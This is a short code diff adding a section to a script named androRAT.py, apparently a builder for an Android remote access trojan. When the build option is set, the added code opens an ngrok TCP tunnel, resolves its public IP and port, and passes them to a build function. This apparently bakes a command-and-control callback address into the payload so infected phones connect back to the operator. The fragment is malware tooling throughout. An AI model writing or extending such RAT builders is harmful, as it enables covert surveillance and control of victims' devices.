@@ -38,3 +38,19 @@ parser.add_argument('-icon', '--icon', help='Visible Icon', action='store_true')
 args = parser.parse_args()
 
 # Part 2: End of androRAT.py
+# Part 3: Start of androRAT.py
+
+if args.build:
+    port_ = args.port
+    icon = True if args.icon else None
+    if args.ngrok:
+        conf.get_default().monitor_thread = False
+        port = 8000 if not port_ else port_
+        tcp_tunnel = ngrok.connect(port, "tcp")
+        ngrok_process = ngrok.get_ngrok_process()
+        domain, port = tcp_tunnel.public_url[6:].split(":")
+        ip = socket.gethostbyname(domain)
+        print(stdOutput("info") + "\033[1mTunnel_IP: %s PORT: %s" % (ip, port))
+        build(ip, port, args.output, True, port_, icon)
+
+# Part 3: End of androRAT.py
